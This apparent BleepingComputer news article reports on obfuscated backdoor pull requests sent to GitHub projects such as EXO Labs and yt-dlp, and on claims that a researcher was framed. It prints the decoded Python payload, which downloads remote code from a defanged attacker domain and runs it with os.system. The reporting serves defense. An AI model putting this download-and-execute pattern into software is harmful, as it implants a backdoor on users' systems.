          <h1>GitHub projects targeted with malicious commits to frame researcher</h1>
          <div class="cz-news-story-title-section">
            <div class="cz-news-title-left-area">
                            By <h6><a rel="author" href="https://www.bleepingcomputer.com/author/ax-sharma/" class="author"><span itemprop="author" itemscope itemtype="https://schema.org/Person"><span itemprop="name">Ax Sharma</span></span></a></h6>
            </div>
	    <meta itemprop="articleSection" content="Security"><div class="cz-news-title-right-area">
              <ul><li class="cz-news-date">November 16, 2024</li>
                <li class="cz-news-time">10:30 AM</li>
                
                <li class="cz-news-comment"><a href="#comments">1</a></li>
              </ul></div>
          </div>
	  <div class="articleBody">
	   
<p style="text-align:center"><img alt="GitHub" height="900" src="https://www.bleepstatic.com/content/hl-images/2024/06/10/GitHub.jpg" width="1600"></p>

<p>GitHub projects have been targeted with&nbsp;malicious commits and pull requests, in an attempt&nbsp;to inject&nbsp;backdoors into these projects.</p>

<p>Most recently, the GitHub repository&nbsp;of Exo Labs, an AI and machine learning startup, was targeted in the attack, which has left many wondering&nbsp;about the attacker's true intentions.</p>

<h2>'Innocent looking PR' caught injecting backdoor</h2>

<p>On Tuesday, Alex Cheema, co-founder of EXO Labs warned everyone of an "innocent looking" code change submitted to EXO's GitHub repository.</p>

<p>The pull request titled "clarify mlx requirement for deepseek models" attempted to modify the <a href="https://github.com/exo-explore/exo/blob/main/exo/models.py" target="_blank" rel="nofollow noopener">models.py</a>&nbsp;Python&nbsp;file in the Exo's&nbsp;code base by adding&nbsp;a sequence of numbers to it:</p>

<blockquote class="twitter-tweet" align="center">
<p dir="ltr" lang="en">Backdoor attempt on <a href="https://twitter.com/exolabs?ref_src=twsrc%5Etfw" rel="nofollow noopener">@exolabs</a> through an innocent looking PR.<br><br>
Read every line of code. Stay safu. <a href="https://t.co/M0WHoCF5Mu" rel="nofollow noopener">pic.twitter.com/M0WHoCF5Mu</a></p>
&mdash; Alex Cheema - e/acc (@alexocheema) <a href="https://twitter.com/alexocheema/status/1856295635143524378?ref_src=twsrc%5Etfw" rel="nofollow noopener">November 12, 2024</a></blockquote>

<p>These are Unicode numbers, each representing a character. In other words, the plaintext Python code has been converted to&nbsp;its numbers-equivalent form via a simple technique employed by the user submitting the code change.</p>

<p>This sequence of characters, "105, 109, 112, 111, 114, 116,..." translates into the following code snippet&nbsp;(URL&nbsp;defanged for safety purposes):</p>

<pre>
<code>import os
import urllib
import urllib.request
x = urllib.request.urlopen("hxxps://www.evildojo[.]com/stage1payload")
y = x.read()
z = y.decode("utf8")
x.close()
os.system(z)</code></pre>

<p>The rather unsophisticated&nbsp;piece of code attempts to connect to evildojo(.)com and, as it appears, download "stage1" payload.</p>

<p>Had the&nbsp;code change been approved and merged into EXO's official repository, which it did not, anyone using the product could end up executing code being remotely served by the URL on their system&mdash;and hence&nbsp;a&nbsp;functional backdoor implanted.</p>

<p>When accessed by BleepingComputer, however, the link returned a 404 (Not Found), and according to several others&nbsp;who tried to access the URL, no content ever existed at the location from the beginning.</p>

<h2>Who is behind it and why?</h2>

<p>This is where it gets tricky and there's no conclusive&nbsp;answer in sight.</p>

<p>The commit appears to have been submitted from a GitHub user, "evildojo666," an account that has since been deleted.</p>

<p>The <a href="http://archive.md/waYje" target="_blank" rel="nofollow noopener">archived page</a>&nbsp;for the GitHub username and the domain evildojo(.)com point to Mike Bell, a Texas-based security researcher, ethical hacker, and software engineer who has persistently denied that he had anything to do with these commits.</p>

<p>Bell claims someone is impersonating him, making these malicious code submissions to smear him.</p>

<div style="text-align:center">
<figure class="image" style="display:inline-block"><a href="https://x.com/evildojo666/status/1856483567259234335?ref_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1856483567259234335%7Ctwgr%5E6725fbfdf983e04e3c16ff8833b5332813504e05%7Ctwcon%5Es1_&amp;ref_url=https%3A%2F%2Fwww.bleepingcomputer.com%2Fnews%2Fsecurity%2Fhackers-attempt-to-backdoor-github-projects-with-malicious-commits%2F" target="_blank" rel="nofollow noopener"><img alt="evildojo statement" height="331" src="https://www.bleepstatic.com/images/news/u/1164866/2024/Nov/exo-malicious-commit/evildojo-tweet.jpg" width="500"></a>

<figcaption><strong>Statement from Mike Bell </strong>(X/Twitter)</figcaption></figure></div>

<p>Bell has further <a href="https://x.com/evildojo666/status/1857467782972969191" target="_blank" rel="nofollow noopener">stated</a> that "there was never any payload...why do people keep assuming there was?"</p>

<p>In all fairness, Bell's story adds up. Anyone can trivially&nbsp;create a GitHub account using another person's details and profile picture, and&nbsp;begin submitting code changes and pull requests to projects&nbsp;&mdash; all under the guise of another person.</p>

<p>The non-existent "stage1payload" page on evildojo's domain is another indicator&nbsp;that, since the domain never served any malicious code in the first place, this is likely to be a smear campaign against the owner of the domain,&nbsp;Mike Bell.</p>

<p>Another now-deleted GitHub account "<a href="https://web.archive.org/web/20241112133637/https://github.com/Darkmage666" target="_blank" rel="nofollow noopener">darkimage666</a>" was&nbsp;<a href="https://x.com/Malcoreio/status/1856334804184109142" target="_blank" rel="nofollow noopener">identified</a> by Malcoreio, a&nbsp;malware analysis and reverse engineering platform. This account also impersonated&nbsp;Bell and appeared to engage in this&nbsp;malicious effort to distribute backdoor commits to open source projects.</p>

<p>"Not me, an impersonator. Notice account deleted. Very sorry people are being dragged into some skid's beef w/ me," <a href="https://x.com/evildojo666/status/1856413636748562827" target="_blank" rel="nofollow noopener">remarked</a>&nbsp;Bell at the imposter&nbsp;account.</p>

<h2>Multiple projects targeted</h2>

<p>Social media users, including&nbsp;<a href="https://x.com/chan__kong/status/1856660199177638052" target="_blank" rel="nofollow noopener">ChrzanKong</a>, noted that some other projects had been targeted by different GitHub user accounts with <a href="https://github.com/search?q=%5B105%2C109%2C112%2C111%2C114%2C116%2C32%2C111%2C115%2C10&amp;type=code" target="_blank" rel="nofollow noopener">similar commits.</a></p>

<p><a href="https://x.com/vxunderground/status/1856450468945506615" target="_blank" rel="nofollow noopener">According to</a> threat intel analyst <em>vx-underground</em>,&nbsp;"<a href="https://github.com/yt-dlp/yt-dlp" target="_blank" rel="nofollow noopener">yt-dlp</a>," a popular open source audio and video downloader was also targeted.&nbsp;Malcore identified <a href="https://x.com/Malcoreio/status/1856334306609647748" target="_blank" rel="nofollow noopener">at least 18 instances</a>&nbsp;of identical pull requests directed at other projects.</p>

<p>At the time of writing, BleepingComputer observed that many such malicious commits and the associated "muppet" GitHub user accounts, some of which appear to be Indonesia-based, have been taken down.</p>

<p>Google engineer and tech events lead, Bogdan Stanga was able to <a href="https://x.com/bdstanga/status/1856430697352708149" target="_blank" rel="nofollow noopener">recreate the pull request</a>&nbsp;to test Presubmit's <a href="https://github.com/presubmit/ai-reviewer" target="_blank" rel="nofollow noopener">AI Reviewer</a>, which uses&nbsp;GitHub Actions to perform instant&nbsp;code reviews against incoming pull requests to your repository. The test code change was immediately flagged with a "critical security" alert by the reviewer:</p>

<div style="text-align:center">
<figure class="image" style="display:inline-block"><img alt="GitHub Actions blocking malicious PRs" height="379" src="https://www.bleepstatic.com/images/news/u/1164866/2024/Nov/exo-malicious-commit/gihub-actions-alert.jpg" width="500"><figcaption><strong>Presubmit's AI reviewer catches similar malicious PRs</strong><br>
(BleepingComputer)</figcaption></figure></div>

<p>The incident, although caught and squashed early on,&nbsp;has echoes of the&nbsp;notable <a href="https://www.bleepingcomputer.com/news/security/red-hat-warns-of-backdoor-in-xz-tools-used-by-most-linux-distros/" target="_blank">xz supply chain attack</a> which recently&nbsp;demonstrated how&nbsp;malicious code could be snuck into legitimate and widely popular open source libraries by nefarious actors.</p>

<p>Open source project maintainers&nbsp;are urged&nbsp;to carefully scrutinize&nbsp;incoming pull requests, via automated tools and extensive human code reviews, even if these appear to be originating from "good faith" contributors.</p>

function cz_strip_tags(input, allowed) {
  allowed = (((allowed || '') + '')
    .toLowerCase()
    .match(/<[a-z][a-z0-9]*>/g) || [])
    .join(''); // making sure the allowed arg is a string containing only tags in lowercase (<a><b><c>)
  var tags = /<\/?([a-z][a-z0-9]*)\b[^>]*>/gi,
    commentsAndPhpTags = /<!--[\s\S]*?-->|<\?(?:php)?[\s\S]*?\?>/gi;
  return input.replace(commentsAndPhpTags, '')
    .replace(tags, function($0, $1) {
      return allowed.indexOf('<' + $1.toLowerCase() + '>') > -1 ? $0 : '';
    });
}
function cz_br2nl(str) {
	var regex = /<br\s*[\/]?>/gi;
    //var pure_str = str.replace(regex,"\n");
    var pure_str = str.replace(regex,"");
    return cz_strip_tags(pure_str,'');
}
